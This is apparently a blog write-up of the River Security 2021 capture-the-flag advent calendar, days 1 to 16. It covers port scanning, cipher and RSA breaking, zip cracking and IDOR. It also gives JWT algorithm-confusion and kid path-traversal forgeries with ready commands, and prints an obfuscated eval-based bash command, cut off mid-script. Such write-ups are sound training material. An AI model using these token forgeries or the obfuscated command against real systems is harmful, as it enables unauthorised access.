---
title: "Writeup: River Security Xmas Challenge (RSXC2021)"
description: "Here is my write-up of the challenges of the company River Security's capture the flag advent calendar, River Security Xmas Challenge (RSXC), for 2021."
pubDate: "Dec 26 2021"
heroImage: "/blog-placeholder-2.jpg"
draft: false
tags:
  - "writeup"
  - "rsxc"
  - "beginner"
  - "2021"
---

Here is my write-up of the challenges of the company River Security's capture the flag advent calendar for 2021, RSXC.

## [DAY 1] The search

### Challenge

> Welcome to the River Security XMas Challenge (RSXC)! RSXC operates with the following flag format for most challenges `RSXC{flag}`. If another flag format is used, the challenge text will mention this.
>
> In this first challenge we have managed to forget which port we are listening on. Could you please find the port listening for traffic? We know it's in the range 30 000-31 000.

### Solution

We have been told that there is an open port in the range 30000 - 31000 on the traffic of the domain. Using the network exploration tool and security, or port scanner tool, nmap. We easily find the port:

```shell
juki@izone:~$ nmap rsxc.no -p30000-31000 -Pn
Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-15 23:27 CET
Nmap scan report for rsxc.no (134.209.137.128)
Host is up (0.036s latency).
Not shown: 1000 closed ports
PORT      STATE SERVICE
30780/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.76 seconds
juki@izone:~$ nc rsxc.no 30780
RSXC{Congrats!You_found_the_secret_port_I_was_trying_to_hide!}
```

The flag is: `RSXC{Congrats!You_found_the_secret_port_I_was_trying_to_hide!}`

## [DAY 2] A magic word

### Challenge

> We have found a magical port that is listening on port 20002, maybe you can find todays flag there?
>
> rsxc.no:20002

### Solution

We know that there is an open port at 20002, connecting to it using the tool `netcat`, we see that it takes in an input and outputs `"That is not the byte I want!"` whenever the user writes in the wrong input.

```shell
juki@izone:~$ nc rsxc.no 20002
aaaa
That is not the byte I want!
```

From the message and the title of the challenge, I guessed that only by inputting the correct letter or byte, will the flag be given. I hacked together a quick Python script with the help of pwntools to send in all the bytes from 0 to 256:

```python
from pwn import *

#context.log_level = "debug"
context.log_level = "error"
for i in range(0,256):
    sh = remote("rsxc.no", 20002)
    sh.send(chr(i))
    print(i)
    flag = sh.recv(timeout=1000)
    if b"RSXC{" in flag: # flag at ascii code 212
        print(flag)
        break
```

The flag is `RSXC{You_found_the_magic_byte_I_wanted_Good_job!}`

## [DAY 3] What does this mean?

### Challenge

> When looking for the prizes to this challenge we came across some text we can't understand, can you help us figure out what it means?
> https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt

### Solution

```
// 03-challenge.txt
ZlhTWk5KQTV6d3JuVzNpQnFyeGl5cXNkSEdBelZWVkdOMVVXRkQzVG5XQjhSSlBxU3VVQjNvVGZlTjJmdll0ZnVDazRyRzk0SzRYSzUxdzlwZktTY1pqMTdBeXNKa0ZWZVpGdXV6Snh1YmF0OWRORWJBbVNGU0RBeDhvdkZGTjh5VG44WnhKUjU2THZ6NFU1dVloeTExaEVEZzRlSGlTS29EWnJvNTVWTng3NUN4RWJwRnRnOUdDZVR2dEtCVldKajVWOFRwOFIzUXI4WmhRVEhON3BGQXM4NWdoMXNzNUxXcXplUW5kTVdnenliaHgxRFU0RlczNXBTU2drdkVtYjc2dnE2TDlzeERYQXpTcXoxNzFOMkZmZ1M4aGdmZFY4VmpnQWlIc1I3ZjU2ZjdBc2h2cFZwdmZmOVd0VUZnSjJFRVBXeENCeFVHOXRQVFpjYTlFUXczaFJUd1M0RlZlTE1TUHNCdXpKWTdxU043cEs5bTlKNWs3cTRNaWI2Ym1Lem9uYXk1bUVNeXJtYVNVNFVnWm9VeG9KdkRrVkhS
```

We are given a text file with the content of something looking like a base64 string. Knowing this, I began to believe that it could easily be solved using an online decryption tool like Cyberchef. Playing with the different operations in cyberchef and the use of the "Magic" tool does finally give us the flag: https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base58('rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz',false)Bzip2_Decompress(false)From_Base85('!-u')From_Morse_Code('Space','Line%20feed')From_Hex('Auto')From_Base32('A-Z2-7%3D',false)

The flag is `RSXC{I_hope_you_used_cyber_chef_it_does_make_it_alot_easier}`.

## [DAY 4] 4 Bytes of XOR

### Challenge

> The flag of the day can be found by xor'ing our text with 4 bytes.
> https://rsxc.no/e26113731cc5514c745bd8f4bdfd43a25b3a9e2286f48fba887910f16e5ad049/04-challenge.txt

### Solution

We are given a text file containing the encoded flag of the day. From the challenge description we know that it is encoded with XOR and the key is of 4 bytes. Knowing that a XOR cipher is insecure if the key used is smaller in length than the plaintext (ie. a repeating key). Another approach is to also bruteforce the key as it is also just 4 bytes. But as the flag format is known `RSXC{`, we can essentially perform a simple known-plaintext attack, and find the key first then solve the challenge by further decoding the flag. A quick python script for the solution looks like this:

```python
# Turn each char of flag into decimals for easier calculation (xoring)
flag = "0xda0x960x0c0x960xf30x880x3b0xa60xfc0x9a0x230xba0xfd0xa90x300x8a0xfb0xa40x2d0x8a0xd00x8a0x060x8a0xe10xb60x3a0xf20xfc0x9a0x200xbd0xe90xb10x0b0xa00xfb0xa00x320xa00xe40x9a0x350xbb0xf10xa80x3b0xa70xed0xb8".replace("0x","")
flag = [int(flag[i:i+2],16) for i in range(0, len(flag), 2)]
print(flag)
# Find key
key = []
key.append(flag[0]^ord("R"))
key.append(flag[1]^ord("S"))
key.append(flag[2]^ord("X"))
key.append(flag[3]^ord("C"))
key = key*20 # Repeat the key many times
print(key)
# XOR
print("".join([chr(x^y) for x,y in zip(flag, key)]))
```

The flag is `RSXC{Most_would_say_XOR_isn't_that_useful_anymore}`

## [DAY 5] Plain discussion

### Challenge

> A spy was listening in on some of our discussion about todays challenge. Can you figure out what he found?
> https://rsxc.no/a28ac32e489c7714b63e26df0f8f0c71d0460e97b898299d32b30192f8f017af/05-challenge.pcap

### Solution

We are given a pcap network traffic capture file containing unencrypted text messages, and as what one would normally do in a network traffic challenge is to begin looking at it and analyzing the different packets found in the .pcap file. Before doing that with wireshark however, I began by stringing the flag thinking that it might be a simple fast solution to the challenge, but there was nothing to be found at first.

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ strings 05-challenge.pcap | grep "RSXC"
```

Following that I stringed for `flag` which did give me enough result for solving the challenge, thus skipping the potential usage of wireshark completely.

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ strings 05-challenge.pcap | grep "flag"
PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?
PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?
PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?
4*#J?V:simen!ubuntu@172.17.0.1 PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?
4*#J?V:simen!ubuntu@172.17.0.1 PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?
:simen!ubuntu@172.17.0.1 PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?
jPRIVMSG #channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?
4*PRIVMSG #channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?
4*PRIVMSG #channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?
:chris!ubuntu@172.17.0.1 PRIVMSG #channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?
:chris!ubuntu@172.17.0.1 PRIVMSG #channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?
x&:chris!ubuntu@172.17.0.1 PRIVMSG #channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?
STOR ./flag.zip
	STOR ./flag.zip
	STOR ./flag.zip
flag.txtUT
flag.txtUT
flag.txtUT
flag.txtUT
```

From the output above and the hint from the messages, I could guess that this challenge could be solved by extracting the password protected flag.zip file and then bruteforcing it using fcrackzip with the 10 digit long number constraints. Quite similar to some of the challenges I have done prior to this. Knowing the solution to this challenge, solving it and bruteforcing the zip file has become as trivial as running the following commands:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ binwalk -e 05-challenge.pcap

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Libpcap capture file, little-endian, version 2.4, Linux "cooked", snaplen: 262144
44141         0xAC6D          Zip archive data, encrypted at least v2.0 to extract, compressed size: 67, uncompressed size: 56, name: flag.txt
44368         0xAD50          End of Zip archive, footer length: 22
44474         0xADBA          Zip archive data, encrypted at least v2.0 to extract, compressed size: 67, uncompressed size: 56, name: flag.txt
44701         0xAE9D          End of Zip archive, footer length: 22

juki@izone:~/Desktop/ctf/rsxc2021$ cd _05-challenge.pcap.extracted/
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ ls
AC6D.zip  ADBA.zip  flag.txt
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ unzip -v ADBA.zip
Archive:  ADBA.zip
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
      56  Defl:N       55   2% 2021-11-10 16:31 79fcc455  flag.txt
--------          -------  ---                            -------
      56               55   2%                            1 file
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ fcrackzip -u --length 10 -p 9954000000 --charset 1 ADBA.zip -v
found file 'flag.txt', (size cp/uc     67/    56, flags 9, chk 3be9)


PASSWORD FOUND!!!!: pw == 9954359864
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ unzip ADBA.zip
Archive:  ADBA.zip
[ADBA.zip] flag.txt password:
replace flag.txt? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: flag.txt
juki@izone:~/Desktop/ctf/rsxc2021/_05-challenge.pcap.extracted$ cat flag.txt
RSXC{Good_job_analyzing_the_pcap_did_you_see_the_hint?}
```

The flag is `RSXC{Good_job_analyzing_the_pcap_did_you_see_the_hint?}`

## [DAY 6] The indecipherable cipher

### Challenge

> We recently did some research on some old ciphers, and found one that supposedly was indecipherable, but maybe you can prove them wrong?
> https://rsxc.no/af00ef8611422bdcd1606f51a55ccbccf16c6ac56a1bea01e4e725dae506aaf0/06-challenge.txt

### Solution

As this is an old cipher challenge, I could guess that the cipher will for most part be insecure and that there is also a high change that there already exist online decoders out there in the Internet for that specific cipher. Knowing this I began by identifying the cipher using [dcode's cipher identification tool](https://www.dcode.fr/cipher-identifier). The result from that tool gave me the cipher `vigènere cipher` as the highest probability. Following that I used the same site for decoding vigenere ciphertexts and found the flag on key `YMZHG`:
![dcode decryption](https://i.imgur.com/CpPvW5u.png)

The flag is `RSXC{isthisnotjustafancycaesarcipher}`

## [DAY 7] This is quite meta

### Challenge

> We found this picture that seemed to contain the flag, but it seems like it has been cropped, are you able to help us retrieve the flag?
> https://rsxc.no/6c9161113dadfbb06d6865f9db5499bd701067c9d69c2452894a8fcf697d21d9/07-challenge.jpg

### Solution

We are given an image file that seems to have some parts of it missing. I guessed from the title that it has something to do with the metadata of the image. Having this in mind, I began to look at it using exiftools:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ exiftool 07-challenge.jpg
ExifTool Version Number         : 11.16
File Name                       : 07-challenge.jpg
Directory                       : .
File Size                       : 9.0 kB
File Modification Date/Time     : 2021:11:25 22:43:28+01:00
File Access Date/Time           : 2021:12:16 12:45:32+01:00
File Inode Change Date/Time     : 2021:12:16 12:45:22+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Comment                         : CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 75.
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 96
Y Resolution                    : 96
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Thumbnail Offset                : 199
Thumbnail Length                : 2265
Image Width                     : 798
Image Height                    : 69
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 1
Image Size                      : 798x69
Megapixels                      : 0.055
Thumbnail Image                 : (Binary data 2265 bytes, use -b option to extract)
```

Looking at the output, there seems to be some some binary data at the metadata "Thumbnail Image". Using [dcode's EXIF Thumbnail Extractor tool](https://www.dcode.fr/exif-thumbnail) I try to extract the thumbnail image hoping that the saved thumbnail of the image is of the uncropped and full image, thus also finding the whole flag:
![dcode decryption](https://i.imgur.com/b50clg5.png)

The flag is: `RSXC{Sometimes_metadata_hides_stuff}`

## [DAY 8] The reference

### Challenge

> I just created a new note saving application, there is still some improvements that can be made but I still decided to show it to you!
> http://rsxc.no:20008

### Solution

We are given a link to a page with different notes saved. Out of all the notes we see that, Note 2, Note 3 and Note 4 are available for us. Opening any of the note directs us to a php site with the GET request `id` of that note number: `http://rsxc.no:20008/notes.php?id=2`. By directly changing the value of `id` and the url to `http://rsxc.no:20008/notes.php?id=0` we receive the flag.

The flag is: `RSXC{Remember_to_secure_your_direct_object_references}`

## [DAY 9] The reference 2

### Challenge

> I see that someone managed to read my personal notes yesterday, so I have improved the security! Good luck!
> http://rsxc.no:20009

### Solution

Navigating to the site shows something that looks quite similar to the last challenge, but with a more secured referencing as it is encoded in some way. Reading the different notes available to us gave us the keywords and hints of: `RFC 1321` and`MD5`, thus hinting to the used algorithm the note ids are encoded/hashed with. To confirm this, I checked the different id from the available notes on crackstation, and it is indeed true:
![crackstation hash lookup](https://i.imgur.com/OqEYN2c.png)

Knowing the naming convention and the hash algorithm used for the note id, I could easily craft my own for "note0":

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ echo -n note0 | md5sum
65b29a77142a5c237d7b21c005b72157  -
```

Navigating to the note with that id (http://rsxc.no:20009/notes.php?id=65b29a77142a5c237d7b21c005b72157) did however not give us the flag directly, and instead tells us that the note with the flag has the id of the md5 hash of the word `flag`. Doing the same steps as above and navigating to the note using this new note id gives us the flag:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ echo -n flag | md5sum
327a6c4304ad5938eaf0efb6cc3e53dc  -
juki@izone:~/Desktop/ctf/rsxc2021$ curl -s http://rsxc.no:20009/notes.php?id=327a6c4304ad5938eaf0efb6cc3e53dc | grep -Eo "RSXC{.*}"
RSXC{MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext}
```

The flag is: `RSXC{MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext}`

## [DAY 10] Lookup

### Challenge

> Sometimes you need to look up to get the answer you need.
> http://rsxc.no:20010

### Solution

Navigating to the page we see an input field telling us to "lookup". After fuzzing for quite some time, I guessed that it could be something about DNS lookup as the title was hinting for it. However, running `dig`, `nslookup` and so on didn't give me any useful results. After a while on a lucky guess I curl'ed the url along with the headers thinking that there might be some useful request headers I might have overlooked, and there it is. The flag was included as a header:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ curl -I rsxc.no:20010/
HTTP/1.1 200 OK
Date: Thu, 16 Dec 2021 16:20:12 GMT
Server: Apache/2.4.51 (Debian)
X-Powered-By: PHP/7.4.26
Flag: RSXC{Sometimes_headers_can_tell_you_something_useful}
Content-Type: text/html; charset=UTF-8
```

The flag is: `RSXC{Sometimes_headers_can_tell_you_something_useful}`

## [DAY 11] The not so random prime

### Challenge

> We intercepted some traffic from a malicious actor. They seemed to be using a not so secure implementation of RSA, could you help us figure out how they did it?
> https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip

### Solution

We are given a rsa encryption script and it's output. Observing the code, we can first see that there’s something strange with the prime generation. The problem is that it doesn't generate two independent random primes as an RSA encryption scheme should. Instead it generates an independent random prime number p (with 1023 or 1024 bits), then a random prime q obtained by the line: `q = nextprime(p * p)` (meaning that q is generated with dependent on p).

Knowing this, we know that N is approximately `p^3`, and taking the cuberoot of N, we can get the approximate for p. Knowing the approximate p or the exact p itself we can easily find `q` and then decrypt everything. A quick python script can be seen below:

```python
from Crypto.PublicKey import RSA #pycryptodome
from Crypto.Cipher import PKCS1_OAEP
from sympy import randprime, nextprime, invert
import base64
import gmpy2
from gmpy2 import mpz

def decode():
    with open("rsa.out") as f:
        n,_,ct = [x.strip() for x in f.readlines()]
    ct = base64.b64decode(ct)
    n = mpz(n)
    e = 65537
    estimate = mpz(gmpy2.iroot(n, 3)[0])
    prime = estimate
    print("r: ",estimate)
    p = mpz(prime)
    q = mpz(n // p)
    assert(p*q == n)
    print("p: ", p)
    print("q: ", q)
    phi = (p-1)*(q-1)
    d = int(invert(e, phi))
    key = RSA.construct((int(n),e,d,int(p),int(q)))
    rsa = PKCS1_OAEP.new(key)
    print(rsa.decrypt(ct))
decode()
```

The flag is: `RSXC{Good_Job!I_see_you_know_how_to_do_some_math_and_how_rsa_works}`

## [DAY 12] Twelve seconds of encoding

### Challenge

> For this challenge you need to do some encoding, but remember, you need to do it quickly, before the time runs out.
> rsxc.no:20012

### Solution

We are given an address to connect to, connecting to it prompts us to solve 100 different encoding and string manipulation tasks in under 12 seconds. As this is probably not possible to do manually by hand, I opted to solve this using python and pwntools. A quick and dirty code for the solution can be seen below:

```python
from pwn import *
from binascii import unhexlify
from base64 import b64decode

sh = remote("rsxc.no", 20012)

sh.recvline()
for i in range(101):
    q = sh.recvline().decode().split(": ")
    q,a = q[0], q[1].strip()
    res = ""
    if "reverse" in q:
        res = a[::-1]
    elif "hex" in q:
        res = unhexlify(a)
    elif "lower" in q:
        res = a.lower()
    elif "base64" in q:
        res = b64decode(a)
    print(q)
    print(a, res)
    sh.sendline(res)
sh.interactive()
```

The flag is: `RSXC{Seems_like_you_have_a_knack_for_encoding_and_talking_to_servers!}`

## [DAY 13] New technology is hard

### Challenge

> When starting with new languages and frameworks, it is easy to get confused, and do things you shouldn't.
> http://rsxc.no:20013

### Solution

Navigating to the site, we are greeted with a basic beginner todo list example in React. However just as the description says, the user seemed to have published the project in development mode and not in production. This means that the source code of the page could be seen. Looking through the source code, we see a base64 string at the file `Todos.js`.

```jsx
import React from "react";

export default function Todos() {
  const b64 =
    "UlNYQ3tpdF9taWdodF9iZV90aGVyZV9ldmVuX2lmX3lvdV9kb24ndF9pbmNsdWRlX2l0IX0=";
  return (
    <div>
      <p>Hide this somewhere, and not just rely on base64: {b64}</p>
    </div>
  );
}
```

Decrypting it gives us the flag:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ echo UlNYQ3tpdF9taWdodF9iZV90aGVyZV9ldmVuX2lmX3lvdV9kb24ndF9pbmNsdWRlX2l0IX0= | base64 -d
RSXC{it_might_be_there_even_if_you_don't_include_it!}
```

The flag is: `RSXC{it_might_be_there_even_if_you_don't_include_it!}`

## [DAY 14] JWT

### Challenge

> Have you heard about the secure information sharing standard JWT? It can sometimes be a little confusing, but I think we got it all figured out.
> http://rsxc.no:20014

### Solution

Looking at the title of the challenge I can guess that this challenge is about a wrong implementation of JSON Web Tokens, an industry standard RFC 7519 method for representing claims securely between two parties. Following the guides from [hacktricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) of different ways a JWT can be exploited. I begin to test the exploit of changing the algorithm RS256(asymmetric) to HS256(symmetric), since we had public key given to us. If the backend is implemented without checking for a specific algorithm, the back end code will then use the public key to both sign and verify the signature, meaning that we can easily manipulate and sign our own token. This was done using the site jwt.io:
![jwt output](https://i.imgur.com/Qjl9Ol4.png)

Navigating to the page with our new and tampered JWT cookie gives us the flag:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ TEMP14=$(curl -s -i 'http://rsxc.no:20014/' | grep -Eo "PHPSESSID=.*?;") # Get PHPSESSIONID
juki@izone:~/Desktop/ctf/rsxc2021$ curl 'http://rsxc.no:20014/' -H "Cookie: $(echo -n $TEMP14)" --data-raw 'username=test&password=test' # LOGIN
juki@izone:~/Desktop/ctf/rsxc2021$ curl -s 'http://rsxc.no:20014/portal.php' -H "Cookie: $(echo -n $TEMP14) jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.gERmL-_S0FkZDAbIE6zrYSIP2MKc3Mrh5jxOWkM8Gyw" | grep -Eo "RSXC{.*}" # SET TAMPERED JWT AND GET FLAG
RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}
```

The flag is: `RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}`

## [DAY 15] JWT 2

### Challenge

> I can admit I might not have figured out everything, but I think everything should be figured out now! I have however implemented a new header I found in RFC 7515.
> http://rsxc.no:20015

### Solution

This challenge seemed to be the same as day 15 but with just `kid`-issues added. `kid` is an optional header claim which holds a key identifier, useful when we have multiple keys to sign the tokens and need to look up the right one to verify the signature. However, we can from this knowledge, utilize it as a type of path traversal giving either an error if the file exists or not. If the `kid` file path check is used within php functions such as `include` or `file_get_content` one could also inject the data in, reading the source. After much trial and error using the well known python [jwt_tool](https://github.com/ticarpi/jwt_tool) for tampering with the token, we find that setting the `kid` value to a php file from the website will print out the data in plaintext for us. Knowing this, I set the `kid` value to `portal.php` (the page responsible for checking and authing the JWT token). Using that tampered token on navigation did give us the flag:

```shell
juki@izone:~/Desktop/ctf/rsxc2021/jwt_tool$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6XC9cL2xvY2FsaG9zdFwvand0UlMyNTYua2V5LnB1YiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.xl3jDlNK0trxkNjEQC5cNxWzZzPGUgGaLIiKHWv6hf2WvEzuuZbTaLSiZNDavs7V7SijOYH1IFQ8vjS_qd2-XQtf4Lc_WR7slsNDlpib4zK7MKXFbzoOm7XQF8bTafl_CBGYB2GU587ZdTsv5FoUPWfe6_XXiHTpQkVZKs-TGs8HQUtF0lDQ0f72XBMtioMoj7BM5cxfoQNYf72UOqucrYmpN_IOjb0ViOBTbU_mpDbrzAYStjqIpmze4mjogQfk5POY1cU3WWZYHv5fmRgBn_dR58IMsedrIdnAsw98J8XSxALFr1DwLC7EVf6rriP_r-3dJJFtEhhTSPQiVZUtrfAZexR7Gw0eg6cdOCICexmAdYw-9TGczzC26Y9R51G-NOHpTPvhw_qU2uD86PQZznN3GpemxvQyMW7c85zs9zGJlJ7TSRs72EJEdeCo08UQ12uuIzIJ2S-WMmoBPcEaibKS3ct-gOGP73ShRfIHF95MHjOcj5B4KHDRApOtL1bLE4p6Hri4m_W6J3U8GaxNctp-QTiSoxYA1dLYWWG9B9vvNhCH_ZKzTshuiC-Qhg3y-0IPPgVcxMUkE7LpbSOdSqIZP0_FJ--Nd5Ebat1I7iJKSGnTVeUILOUBYSuyaG1w5wp1ghqIFk5xwS6sMbIm_tCEJlMgWmWgFyerjh3QaI8 -I -hc kid -hv "portal.php" -S hs256 -p "" -pc username -pv admin -pk ../jwtRS256.key.pub

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi

Original JWT:

jwttool_b369f60acd84aec98b34740db6882c06 - Tampered token - HMAC Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InBvcnRhbC5waHAifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.PbNF4szD3H-puzObv0p4MgXUudQSmvIuxmwjfhQYguQ
```

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ TEMP15=$(curl -s -i 'http://rsxc.no:20015/' | grep -Eo "PHPSESSID=.*?;") # Get PHPSESSIONID
juki@izone:~/Desktop/ctf/rsxc2021$ curl 'http://rsxc.no:20015/' -H "Cookie: $(echo -n $TEMP15)" --data-raw 'username=test&password=test' # LOGIN
juki@izone:~/Desktop/ctf/rsxc2021/jwt_tool$ curl -s -i 'http://rsxc.no:20015/portal.php' -H "Cookie: $(echo -n $TEMP15) jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InBvcnRhbC5waHAifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.PbNF4szD3H-puzObv0p4MgXUudQSmvIuxmwjfhQYguQ" | grep -Eo "RSXC{.*}" # SET TAMPERED JWT AND GET FLAG
RSXC{Don't_let_others_decide_where_your_keys_are_located}
```

The flag is: `RSXC{Don't_let_others_decide_where_your_keys_are_located}`

## [DAY 16] A scary command

### Challenge

> Sometimes while monitoring networks and machines, or doing incident response, we find some obfuscated commands. We didn't have time to deobfuscate this, and it is not recommended to just run it. Could you help us with it?
> https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh

### Solution

Downloading the shell file, we see some obfuscated bash scripting. Running this blindly is probably not a good idea as just as the title says, it might be a scary command. What I began to do in order to reverse this obfuscation is to comment out the `eval` commands and swapping it with echo, seen below. Running this following script outputs some further steps to do:

```bash
# 16-challenge.sh
gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '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
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
